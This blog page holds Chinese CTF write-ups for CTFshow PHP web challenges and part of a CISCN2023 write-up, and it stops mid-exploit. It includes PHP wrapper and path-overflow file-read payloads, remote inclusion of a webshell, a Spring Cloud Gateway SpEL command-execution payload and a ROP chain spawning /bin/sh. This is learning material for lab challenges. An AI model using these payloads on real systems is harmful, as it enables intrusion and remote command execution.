函数之后输出 <code>$foo</code> 变量的值，应该会得到 <code>$bar</code>的值：</p><pre class="language-php" data-language="php"><code class="language-php">var_dump($foo);  &#x2F;&#x2F; 输出 string(8) &quot;i am bar&quot;</code></pre><p>测试如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684337748600-cf869928-8df9-4731-ac96-582deef8fea3.png" alt="image.png"><br>PS：byd我最开始还让gpt忽悠了，后来反应过来了，改回来了。再提醒一下，不要忘记编程语言的基础，<code>=</code>是赋值，不是取等！</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpfunction getFlag(&amp;$v1,&amp;$v2)&#123;    eval(&quot;$$v1 &#x3D; &amp;$$v2;&quot;);    var_dump($$v1);&#125;$v1 &#x3D; &#39;a&#39;;$v2 &#x3D; &#39;GLOBALS&#39;;$$v1 &#x3D; &amp;$$v2;getFlag($v1,$v2);?&gt;</code></pre><p>和指针类似，稍微理一下，也就是$a给予了和$GLOBALS相同的超全局变量。最后vardump的是$a。</p><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>global和$GLOBALS：<a href="https://www.php.cn/php-weizijiaocheng-369541.html">https://www.php.cn/php-weizijiaocheng-369541.html</a></p><h1 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h1><h3 id="考点：php伪协议绕过is-file-highlight-file-对于php伪协议的使用"><a href="#考点：php伪协议绕过is-file-highlight-file-对于php伪协议的使用" class="headerlink" title="考点：php伪协议绕过is_file+highlight_file  对于php伪协议的使用"></a>考点：php伪协议绕过is_file+highlight_file  对于php伪协议的使用</h3><pre class="language-python" data-language="python"><code class="language-python">highlight_file(__FILE__);error_reporting(0);function filter($file)&#123;    if(preg_match(&#39;&#x2F;\.\.\&#x2F;|http|https|data|input|rot13|base64|string&#x2F;i&#39;,$file))&#123;        die(&quot;hacker!&quot;);    &#125;else&#123;        return $file;    &#125;&#125;$file&#x3D;$_GET[&#39;file&#39;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125;</code></pre><p>可以直接读文件<code>?file=php://filter/resource=flag.php</code><br>除此之外，还有几种特殊的编码方式<br><code>file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</code>（这个之前没见过，注意一下）<br><code>file=compress.zlib://flag.php</code><br><code>php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</code></p><h1 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h1><blockquote><p><a href="https://www.cnblogs.com/meng-han/p/16803560.html#:~:text=ctfshow%20web112%20%28%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87is_file%E5%87%BD%E6%95%B0%29%20%24file%20%3D%20%24_GET%20%5B%20%27file%27,%7D%20else%20%7B%20echo%20%22hacker%21%22%20%3B%20%7D%20%E8%BF%99%E9%87%8C%E7%9A%84is_file%E5%87%BD%E6%95%B0%EF%BC%8C%E5%9C%A8%E4%BD%BF%E7%94%A8php%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%97%B6%E5%80%99%E4%BC%9A%E8%BF%94%E5%9B%9Efalse%EF%BC%8C%E9%99%A4%E4%BA%86file%3A%2F%2F%E5%8D%8F%E8%AE%AE%E4%BB%A5%E5%A4%96%E3%80%82">https://www.cnblogs.com/meng-han/p/16803560.html#:~:text&#x3D;ctfshow%20web112%20%28%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87is_file%E5%87%BD%E6%95%B0%29%20%24file%20%3D%20%24_GET%20%5B%20%27file%27,%7D%20else%20%7B%20echo%20%22hacker%21%22%20%3B%20%7D%20%E8%BF%99%E9%87%8C%E7%9A%84is_file%E5%87%BD%E6%95%B0%EF%BC%8C%E5%9C%A8%E4%BD%BF%E7%94%A8php%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%97%B6%E5%80%99%E4%BC%9A%E8%BF%94%E5%9B%9Efalse%EF%BC%8C%E9%99%A4%E4%BA%86file%3A%2F%2F%E5%8D%8F%E8%AE%AE%E4%BB%A5%E5%A4%96%E3%80%82</a></p></blockquote><h3 id="考点：目录溢出"><a href="#考点：目录溢出" class="headerlink" title="考点：目录溢出"></a>考点：目录溢出</h3><pre class="language-python" data-language="python"><code class="language-python">highlight_file(__FILE__);error_reporting(0);function filter($file)&#123;    if(preg_match(&#39;&#x2F;filter|\.\.\&#x2F;|http|https|data|data|rot13|base64|string&#x2F;i&#39;,$file))&#123;        die(&#39;hacker!&#39;);    &#125;else&#123;        return $file;    &#125;&#125;$file&#x3D;$_GET[&#39;file&#39;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125;</code></pre><p><code>?file=compress.zlib://flag.php</code><br>除此之外，有个预期解：<code>?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code><br>在linux中&#x2F;proc&#x2F;self&#x2F;root是指向根目录的，也就是如果在命令行中输入ls &#x2F;proc&#x2F;self&#x2F;root，其实显示的内容是根目录下的内容。<br>原理：is_file函数能处理的长度有限,用&#x2F;proc&#x2F;self&#x2F;root可以目录溢出</p><h1 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h1><pre class="language-python" data-language="python"><code class="language-python">error_reporting(0);highlight_file(__FILE__);function filter($file)&#123;    if(preg_match(&#39;&#x2F;compress|root|zip|convert|\.\.\&#x2F;|http|https|data|data|rot13|base64|string&#x2F;i&#39;,$file))&#123;        die(&#39;hacker!&#39;);    &#125;else&#123;        return $file;    &#125;&#125;$file&#x3D;$_GET[&#39;file&#39;];echo &quot;师傅们居然tql都是非预期 哼！&quot;;if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;</code></pre><p>这个直接使用<code>?file=php://filter/resource=flag.php</code>就行</p><h1 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h1><h3 id="考点：trim函数的绕过-is-numeric绕过"><a href="#考点：trim函数的绕过-is-numeric绕过" class="headerlink" title="考点：trim函数的绕过+is_numeric绕过"></a>考点：trim函数的绕过+is_numeric绕过</h3><pre class="language-python" data-language="python"><code class="language-python">include(&#39;flag.php&#39;);highlight_file(__FILE__);error_reporting(0);function filter($num)&#123;    $num&#x3D;str_replace(&quot;0x&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;0&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;.&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;e&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;+&quot;,&quot;1&quot;,$num);    return $num;&#125;$num&#x3D;$_GET[&#39;num&#39;];if(is_numeric($num) and $num!&#x3D;&#x3D;&#39;36&#39; and trim($num)!&#x3D;&#x3D;&#39;36&#39; and filter($num)&#x3D;&#x3D;&#39;36&#39;)&#123;    if($num&#x3D;&#x3D;&#39;36&#39;)&#123;        echo $flag;    &#125;else&#123;        echo &quot;hacker!!&quot;;    &#125;&#125;else&#123;    echo &quot;hacker!!!&quot;;&#125;</code></pre><h3 id="trim函数"><a href="#trim函数" class="headerlink" title="trim函数"></a>trim函数</h3><pre class="language-python" data-language="python"><code class="language-python">语法trim(string,charlist)参数        描述string        必需。规定要检查的字符串。charlist    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：&quot;\0&quot;       - NULL&quot;\t&quot;       - 制表符&quot;\n&quot;       - 换行&quot;\x0B&quot;     - 垂直制表符&quot;\r&quot;       - 回车&quot; &quot;        - 空格</code></pre><p>测试程序：</p><pre class="language-python" data-language="python"><code class="language-python">&lt;?phpfor ($i&#x3D;0; $i &lt;&#x3D;128 ; $i++) &#123;$x&#x3D;chr($i).&#39;1&#39;;if(trim($x)!&#x3D;&#x3D;&#39;1&#39; &amp;&amp;  is_numeric($x))&#123;echo urlencode(chr($i)).&quot;\n&quot;;&#125;&#125;</code></pre><p>发现除了+-.号以外还有只剩下%0c也就是换页符了，所以这个题只有这一个固定的解了。<br><code>num=%0c36</code></p><h1 id="web123、web125、web126"><a href="#web123、web125、web126" class="headerlink" title="*web123、web125、web126"></a>*web123、web125、web126</h1><blockquote><p><a href="https://blog.csdn.net/miuzzx/article/details/109181768">https://blog.csdn.net/miuzzx/article/details/109181768</a></p></blockquote><h3 id="考点：php变量不允许出现-传入-代替-SERVER-‘argv’"><a href="#考点：php变量不允许出现-传入-代替-SERVER-‘argv’" class="headerlink" title="考点：php变量不允许出现. 传入[代替_ $_SERVER[‘argv’]"></a>考点：php变量不允许出现. 传入[代替_ $_SERVER[‘argv’]</h3><pre class="language-python" data-language="python"><code class="language-python">error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a&#x3D;$_SERVER[&#39;argv&#39;];$c&#x3D;$_POST[&#39;fun&#39;];if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;    if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\%|\^|\*|\-|\+|\&#x3D;|\&#123;|\&#125;|\&quot;|\&#39;|\,|\.|\;|\?&#x2F;&quot;, $c)&amp;&amp;$c&lt;&#x3D;18)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);           if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;?&gt;</code></pre><p>第一个问题是php变量名是不允许点的使用的：<br>比如可以测试一下：</p><pre class="language-python" data-language="python"><code class="language-python">&lt;?phpvar_dump($_POST);输入 CTF_SHOW.COM&#x3D;1返回array(1) &#123; [&quot;CTF_SHOW_COM&quot;]&#x3D;&gt; string(1) &quot;1&quot; &#125;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688182650580-e505632b-147a-4bc7-8dbd-d8b01aa593fd.png" alt="image.png"><br>另外有一个知识点，使用<code>[</code>来代替下划线，具体原因未知，爆破脚本如下：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php  function curl($url,$data)&#123;  $ch &#x3D; curl_init(); curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, $data);$response &#x3D; curl_exec($ch);curl_close($ch);return strlen($response);&#125;$url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&quot;;for ($i&#x3D;0; $i &lt;&#x3D;128 ; $i++) &#123;   for ($j&#x3D;0; $j &lt;&#x3D;128 ; $j++) &#123;    $data&#x3D;&quot;CTF&quot;.urlencode(chr($i)).&quot;SHOW&quot;.urlencode(chr($j)).&quot;COM&quot;.&quot;&#x3D;123&quot;;    if(curl($url,$data)!&#x3D;0)&#123;      echo $data.&quot;\n&quot;;     &#125;  &#125;&#125;</code></pre><p>test.php:</p><pre class="language-python" data-language="python"><code class="language-python">&lt;?phpif(isset($_POST[&#39;CTF_SHOW.COM&#39;]))&#123;    echo 123;&#125;</code></pre><p>输出结果<br><code>CTF%5BSHOW.COM=123</code><br>另外</p><pre class="language-python" data-language="python"><code class="language-python">1、cli模式（命令行）下第一个参数$_SERVER[&#39;argv&#39;][0]是脚本名，其余的是传递给脚本的参数2、web网页模式下在web页模式下必须在php.ini开启register_argc_argv配置项    设置register_argc_argv &#x3D; On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果    这时候的$_SERVER[‘argv’][0] &#x3D; $_SERVER[‘QUERY_STRING’]    $argv,$argc在web模式下不适用</code></pre><p>因为我们是在网页模式下运行的，所以<code>$_SERVER[&#39;argv&#39;][0] = $_SERVER[&#39;QUERY_STRING&#39;]</code>也就是<code>$a[0]= $_SERVER[&#39;QUERY_STRING&#39;]</code><br>这时候我们只要通过 <code>eval(&quot;$c&quot;.&quot;;&quot;);</code>将$flag赋值<code>flag_give_me</code>就可以了。<br>payload如下：</p><pre class="language-python" data-language="python"><code class="language-python">payload:get:  $fl0g&#x3D;flag_give_me;post:  CTF_SHOW&#x3D;1&amp;CTF%5bSHOW.COM&#x3D;1&amp;fun&#x3D;eval($a[0])</code></pre><p>非预期：</p><pre class="language-python" data-language="python"><code class="language-python">post: CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;echo $flagpost: CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;var_dump($GLOBALS)   题目出不来，本地测试可以</code></pre><pre class="language-python" data-language="python"><code class="language-python">get: a&#x3D;1+fl0g&#x3D;flag_give_mepost: CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1])</code></pre><p>测试：</p><pre class="language-python" data-language="python"><code class="language-python">&lt;?php$a&#x3D;$_SERVER[&#39;argv&#39;];var_dump($a);传入 a&#x3D;1+fl0g&#x3D;flag_give_me结果如下array(2) &#123; [0]&#x3D;&gt; string(3) &quot;a&#x3D;1&quot; [1]&#x3D;&gt; string(17) &quot;fl0g&#x3D;flag_give_me&quot; &#125;</code></pre><p>原理：</p><pre class="language-python" data-language="python"><code class="language-python">CLI模式下直接把 request info ⾥⾯的argv值复制到arr数组中去继续判断query string是否为空，如果不为空把通过+符号分割的字符串转换成php内部的zend_string，然后再把这个zend_string复制到 arr 数组中去。</code></pre><h1 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h1><pre class="language-python" data-language="python"><code class="language-python">error_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$ctf_show &#x3D; md5($flag);$url &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];&#x2F;&#x2F;特殊字符检测function waf($url)&#123;    if(preg_match(&#39;&#x2F;\&#96;|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#39;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\&#x2F;&#x2F;&#39;, $url))&#123;        return true;    &#125;else&#123;        return false;    &#125;&#125;if(waf($url))&#123;    die(&quot;嗯哼？&quot;);&#125;else&#123;    extract($_GET);&#125;if($ctf_show&#x3D;&#x3D;&#x3D;&#39;ilove36d&#39;)&#123;    echo $flag;&#125;</code></pre><p>测试跑一下：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpfunction curl($url)&#123;    $ch&#x3D;curl_init($url);    curl_setopt($ch, CURLOPT_HEADER, 0);    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);    $result&#x3D;curl_exec($ch);    curl_close($ch);    return strlen($result);&#125;for ($i&#x3D;0; $i &lt; 128; $i++) &#123;     $url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php?ctf&quot;.urlencode(chr($i)).&quot;show&#x3D;1&quot;;    if(curl($url)!&#x3D;&#x3D;0)&#123;        echo urlencode(chr($i)).&quot;\n&quot;;    &#125;&#125;</code></pre><p>flag.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpif(isset($_GET[&#39;ctf_show&#39;]))&#123;echo 123;&#125;</code></pre><p>以下的这些字符可以代替<code>_</code></p><pre class="language-php" data-language="php"><code class="language-php">+ _ [ .  +  这里的加号在url中起到空格的作用</code></pre><p>出去过滤掉的字符，可以使用空格实现<br>payload：<code>ctf show=ilove36d</code></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这种题需要有fuzz的技术，得学一下这个php就脚本的写法。</p><h1 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h1><h3 id="考点：gettext（”-”）函数的使用-查看所有变量get-defined-vars"><a href="#考点：gettext（”-”）函数的使用-查看所有变量get-defined-vars" class="headerlink" title="考点：gettext（”_”）函数的使用+查看所有变量get_defined_vars"></a>考点：gettext（”_”）函数的使用+查看所有变量get_defined_vars</h3><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$f1 &#x3D; $_GET[&#39;f1&#39;];$f2 &#x3D; $_GET[&#39;f2&#39;];if(check($f1))&#123;    var_dump(call_user_func(call_user_func($f1,$f2)));&#125;else&#123;    echo &quot;嗯哼？&quot;;&#125;function check($str)&#123;    return !preg_match(&#39;&#x2F;[0-9]|[a-z]&#x2F;i&#39;, $str);&#125;</code></pre><p>连续两次调用，而且会检查f1函数名称，特殊字符的函数只有<code>_</code>，所对应的函数为：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688274254001-69cdf9cb-1498-4251-9d53-cb854861e579.png" alt="image.png"><br>  <img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688274251016-f41af228-5679-445a-967b-315d8677c759.png" alt="image.png"><br>可以借由输出字符串<br>使用<code>f1=_&amp;f2=phpinfo</code>就可以查看到php信息<br>由于题目有<code>include(&#39;flag.php&#39;)</code>可以直接输出所有变量：<br>payload：<code>f1=_&amp;f2=get_defined_vars</code>即可</p><h1 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h1><blockquote><p><a href="https://blog.csdn.net/miuzzx/article/details/109181768">https://blog.csdn.net/miuzzx/article/details/109181768</a></p></blockquote><h3 id="考点：stripos"><a href="#考点：stripos" class="headerlink" title="考点：stripos"></a>考点：stripos</h3><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#39;f&#39;]))&#123;    $f &#x3D; $_GET[&#39;f&#39;];    if(stripos($f, &#39;ctfshow&#39;)&gt;0)&#123;        echo readfile($f);    &#125;&#125;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688276827328-a519e966-3864-4e99-9157-4cbabe21a2f1.png" alt="image.png"></p><h2 id="方法1-远程文件包含"><a href="#方法1-远程文件包含" class="headerlink" title="方法1 远程文件包含"></a>方法1 远程文件包含</h2><p>一个方法是远程文件包含，在自己的服务器上写一句话木马，然后保存为txt文档，然后如下使用：<br><code>f=http://url/xxx.txt?ctfshow</code><br>测试一下：<br>在根目录写一个一句话木马：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688279012856-b10947c0-ec54-4c88-950a-181dcc097ce8.png" alt="image.png"><br>注意，一定要能访问得到，放在对应www或者wwwroot目录下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688279781611-621b25c1-bd8f-42bd-baac-336ec755e9ca.png" alt="6c4d3974c2ebcc5e4389c8ca31c7cac.png"><br>然后简单测试一下：<br>能够获取到，但是不能够rce<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688280341422-1fa73f65-9741-4958-a762-11660750fdfd.png" alt="image.png"><br>不知道为什么。</p><h2 id="方法2-直接使用伪协议"><a href="#方法2-直接使用伪协议" class="headerlink" title="方法2 直接使用伪协议"></a>方法2 直接使用伪协议</h2><p><code>?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php</code><br>base64解密即可</p><h2 id="方法3-目录穿越"><a href="#方法3-目录穿越" class="headerlink" title="方法3 目录穿越"></a>方法3 目录穿越</h2><p><code>/ctfshow/../../../../var/www/html/flag.php</code></p><h1 id="web130、web131"><a href="#web130、web131" class="headerlink" title="web130、web131"></a>web130、web131</h1><h2 id="考点：pregmatch最大回溯次数绕过"><a href="#考点：pregmatch最大回溯次数绕过" class="headerlink" title="考点：pregmatch最大回溯次数绕过"></a>考点：pregmatch最大回溯次数绕过</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#39;f&#39;]))&#123;    $f &#x3D; $_POST[&#39;f&#39;];    if(preg_match(&#39;&#x2F;.+?ctfshow&#x2F;is&#39;, $f))&#123;        die(&#39;bye!&#39;);    &#125;    if(stripos($f, &#39;ctfshow&#39;) &#x3D;&#x3D;&#x3D; FALSE)&#123;        die(&#39;bye!!&#39;);    &#125;    echo $flag;&#125;</code></pre><p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了。<br>直接用python脚本即可：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; r&quot;http:&#x2F;&#x2F;44ff0304-988a-4fea-b5a4-4dcd7874d335.challenge.ctf.show&#x2F;&quot;data &#x3D; &#123;    &#39;f&#39;: &#39;very&#39; * 250000 + &#39;ctfshow&#39;&#125;r &#x3D; requests.post(url, data&#x3D;data)print(r.text)</code></pre><pre class="language-php" data-language="php"><code class="language-php">&lt;?php  echo str_repeat(&#39;very&#39;, &#39;250000&#39;).&#39;36Dctfshow&#39;;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688281327546-67e6816e-fcde-44ea-819f-e0d4e513075d.png" alt="image.png"><br>除此之外还可直接：<code>f=ctfshow</code>后面接任意字符均可<br>或者使用空数组：<code>f[]=ctfshow</code><br>但是131似乎就只能使用回溯超出做了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2023 wp</title>
      <link href="/posts/12c981c1/"/>
      <url>/posts/12c981c1/</url>
      
        <content type="html"><![CDATA[<h1 id="战队答题情况"><a href="#战队答题情况" class="headerlink" title="战队答题情况"></a>战队答题情况</h1><h2 id="排名：282"><a href="#排名：282" class="headerlink" title="排名：282"></a>排名：282</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368785969-9737117c-25d9-4a53-a14f-96b88afe88c2.png" alt="a6f287c23150ba48b360dcc75e6c0b0.png"></p><h2 id="解题列表"><a href="#解题列表" class="headerlink" title="解题列表"></a>解题列表</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><ul><li>BackendService</li></ul><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><ul><li>烧烤摊儿 </li><li>funcanary</li></ul><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><ul><li>签到卡 </li><li>pyshell </li><li>网络安全人才实战能力评价现状调查问卷</li></ul><h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><ul><li>babyRE </li><li>ezAndroid</li></ul><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><ul><li>基于国密SM2算法的密钥密文分发 </li><li>Sign_in_passwd</li></ul><hr><h1 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h1><h2 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h2><p>在nacos权限绕过漏洞，网上找了一个payload<br>nacos抓包，修改返回包中参数，登录<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685266452751-28fda1ed-0ad2-4eee-af5b-1ddf328b434c.png" alt="image.png"><br><a href="https://xz.aliyun.com/t/11493#toc-5">https://xz.aliyun.com/t/11493#toc-5</a><br>对源码进行审计发现springcloud3.05 spel注入漏洞，在新建配置文件，名为backcfg</p><pre class="language-php" data-language="php"><code class="language-php">&#123;  &quot;spring&quot;: &#123;    &quot;cloud&quot;: &#123;      &quot;gateway&quot;: &#123;        &quot;routes&quot;: [          &#123;            &quot;id&quot;: &quot;exam&quot;,            &quot;order&quot;: 0,            &quot;uri&quot;: &quot;lb:&#x2F;rvice-provider&quot;,            &quot;predicates&quot;: [              &quot;Path&#x3D;&#x2F;echo&#x2F;**&quot;            ],            &quot;filters&quot;: [              &#123;                &quot;name&quot;: &quot;AddResponseHeader&quot;,                &quot;args&quot;: &#123;                  &quot;name&quot;: &quot;result&quot;,                  &quot;value&quot;: &quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#39;id&#39;&#125;).getInputStream())).replaceAll(&#39;\n&#39;,&#39;&#39;).replaceAll(&#39;\r&#39;,&#39;&#39;)&#125;&quot;                &#125;              &#125;            ]          &#125;        ]      &#125;    &#125;  &#125;&#125;</code></pre><p>利用curl外带flag即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685268408418-725f086c-ecf3-4b0c-ba3a-ab2b4af493db.png" alt="image.png"></p><h1 id="Pwn-1"><a href="#Pwn-1" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="27日-烧烤摊儿"><a href="#27日-烧烤摊儿" class="headerlink" title="27日_烧烤摊儿"></a>27日_烧烤摊儿</h2><p>本地执行发现买东西是如果输入负数会给自己加钱，然后买下店铺，改名，发现存在栈溢出，试出溢出为0x28，因为是静态，所以用ROPgadget –binary shaokao –ropchain可以获得payload，只需要填偏移即可。<br>exp：</p><pre class="language-python" data-language="python"><code class="language-python">from pwn import *from LibcSearcher import *from struct import packcontext.log_level&#x3D;&#39;debug&#39;#io&#x3D;remote()io&#x3D;process(&#39;.&#x2F;shaokao&#39;)elf&#x3D;ELF(&#39;.&#x2F;shaokao&#39;)io.recvuntil(&quot;&gt; &quot;)io.sendline(&quot;1&quot;)io.recv()io.sendline(&quot;1&quot;)io.recv()io.sendline(&quot;-1000000&quot;)io.recv()io.sendline(&quot;4&quot;)io.recv()io.sendline(&quot;5&quot;)# Padding goes herep &#x3D; b&#39;a&#39;*0x28p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000040a67e) # pop rsi ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004e60e0) # @ .datap +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000458827) # pop rax ; retp +&#x3D; b&#39;&#x2F;bin&#x2F;&#x2F;sh&#39;p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045af95) # mov qword ptr [rsi], rax ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000040a67e) # pop rsi ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004e60e8) # @ .data + 8p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000447339) # xor rax, rax ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045af95) # mov qword ptr [rsi], rax ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000040264f) # pop rdi ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004e60e0) # @ .datap +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000040a67e) # pop rsi ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004e60e8) # @ .data + 8p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004a404b) # pop rdx ; pop rbx ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004e60e8) # @ .data + 8p +&#x3D; pack(&#39;&lt;Q&#39;, 0x4141414141414141) # paddingp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000447339) # xor rax, rax ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 